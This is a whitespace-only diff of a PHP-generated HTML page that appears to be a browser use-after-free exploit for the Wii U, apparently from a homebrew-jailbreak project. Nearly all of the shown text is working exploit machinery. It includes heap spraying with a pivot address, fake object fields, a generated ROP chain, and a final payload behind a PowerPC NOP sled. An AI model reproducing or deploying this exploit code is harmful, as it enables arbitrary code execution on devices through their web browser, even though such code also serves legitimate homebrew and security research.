@@ -1,11 +1,11 @@
 <?php
 //Useful function
 function hexentities($str) {
-	$return = '';
-	for($i = 0; $i < strlen($str); $i++) {
-		$return .= '0x'.bin2hex(substr($str, $i, 1)).', ';
-	}
-	return $return;
+    $return = '';
+    for($i = 0; $i < strlen($str); $i++) {
+        $return .= '0x'.bin2hex(substr($str, $i, 1)).', ';
+    }
+    return $return;
 }
 
 // Settings
@@ -36,26 +36,26 @@ Result: Bug is present, crash
 <script>
 function UaF(a)
 {
-	function arrayBufferConsoleAsHex( buffer, callback ) {
-		var blob = new Blob([buffer],{type:'application/octet-binary'});
-		var reader = new FileReader();
-		reader.onload = function(evt){
-			var dataurl = evt.target.result;
-			callback(base64ToBase16(dataurl.substr(dataurl.indexOf(',')+1)));
-		};
-		reader.readAsDataURL(blob);
-	}
-	
-	function base64ToBase16(base64) {
-		return window.atob(base64)
-			  .split('')
-			  .map(function (aChar) {
-				return ('0' + aChar.charCodeAt(0).toString(16)).slice(-2);
-			  })
-			 .join('')
-			 .toUpperCase(); // Per your example output
-	}
-	
+    function arrayBufferConsoleAsHex( buffer, callback ) {
+        var blob = new Blob([buffer],{type:'application/octet-binary'});
+        var reader = new FileReader();
+        reader.onload = function(evt){
+            var dataurl = evt.target.result;
+            callback(base64ToBase16(dataurl.substr(dataurl.indexOf(',')+1)));
+        };
+        reader.readAsDataURL(blob);
+    }
+    
+    function base64ToBase16(base64) {
+        return window.atob(base64)
+              .split('')
+              .map(function (aChar) {
+                return ('0' + aChar.charCodeAt(0).toString(16)).slice(-2);
+              })
+             .join('')
+             .toUpperCase(); // Per your example output
+    }
+    
     //Warning, the delta was modified !
     var delta                   = 0x0<!--#echo var="delta" -->000000; //from 0x0 to 0x04000000 step by 0x01000000
     var pivotAdress             = 0x010ADDCC;
@@ -98,16 +98,16 @@ function UaF(a)
     dv.setUint32(0x0C, 0x00000000);         //m_failedLoadURL
     dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
     dv.setUint32(0x14, 0x00000000);         //padding
-	
+    
     //Rop helper
     
-	var ropCurrentDv = null;
-	var ropCurrentOffset = 0;
+    var ropCurrentDv = null;
+    var ropCurrentOffset = 0;
 
-	function ropchain_appendu8(val){
-		ropCurrentDv.setUint8(ropCurrentOffset, val);
-		ropCurrentOffset += 1;
-	}
+    function ropchain_appendu8(val){
+        ropCurrentDv.setUint8(ropCurrentOffset, val);
+        ropCurrentOffset += 1;
+    }
     
 
     //Spray large ArrayBuffer with pivotAdress
@@ -129,40 +129,40 @@ function UaF(a)
         //initialize this Rop Chain
         ropCurrentDv = ar[i];
         ropCurrentOffset = 0x304;
-		
-		var ropPrintStart = ropCurrentOffset;
+        
+        var ropPrintStart = ropCurrentOffset;
 
         //start of the Rop Chain
-		<?php
-			// This php function generates the ROP and places it into the global variable $ROPCHAIN
-			generate_ropchain();
-			echo $ROPCHAIN; // creates "var realROPChain = [...];" when "$ROPCHAIN_JS_VAR = 1;"
-		?>
+        <?php
+            // This php function generates the ROP and places it into the global variable $ROPCHAIN
+            generate_ropchain();
+            echo $ROPCHAIN; // creates "var realROPChain = [...];" when "$ROPCHAIN_JS_VAR = 1;"
+        ?>
         realROPChain.forEach(function(element) {
-		  ropchain_appendu8(element);
-		});
-		
-		//arrayBufferConsoleAsHex(ar[i].buffer.slice(ropPrintStart,ropCurrentOffset), console.log.bind(console));
+          ropchain_appendu8(element);
+        });
+        
+        //arrayBufferConsoleAsHex(ar[i].buffer.slice(ropPrintStart,ropCurrentOffset), console.log.bind(console));
     }
 
     //Spray final payload
     //Middle range 0x1C9E0000
-	var ar2 = new Array(sprayCount);
+    var ar2 = new Array(sprayCount);
     for(var i=0; i<sprayCount; i++){
-		 ar2[i] = new Uint8Array(
-		 	<?php
-			$payload = wiiuhaxx_generatepayload();
-			// Place a bunch of nops before our actual payload so the total size is 0x4000 bytes.
-			echo "[";
-			for($iNop = 0;$iNop<(0x4000-strlen($payload))/4;$iNop++){
-				echo " 0x60, 0x00, 0x00, 0x00,"; // nop
-			}
-			echo hexentities($payload) . "]";
-			?>
-		 );		
+         ar2[i] = new Uint8Array(
+             <?php
+            $payload = wiiuhaxx_generatepayload();
+            // Place a bunch of nops before our actual payload so the total size is 0x4000 bytes.
+            echo "[";
+            for($iNop = 0;$iNop<(0x4000-strlen($payload))/4;$iNop++){
+                echo " 0x60, 0x00, 0x00, 0x00,"; // nop
+            }
+            echo hexentities($payload) . "]";
+            ?>
+         );        
     }
-	
-	//arrayBufferConsoleAsHex(ar2[0].buffer.slice(0x0,0x4000), console.log.bind(console)); 
+    
+    //arrayBufferConsoleAsHex(ar2[0].buffer.slice(0x0,0x4000), console.log.bind(console)); 
 
     //alert("wait...");
 
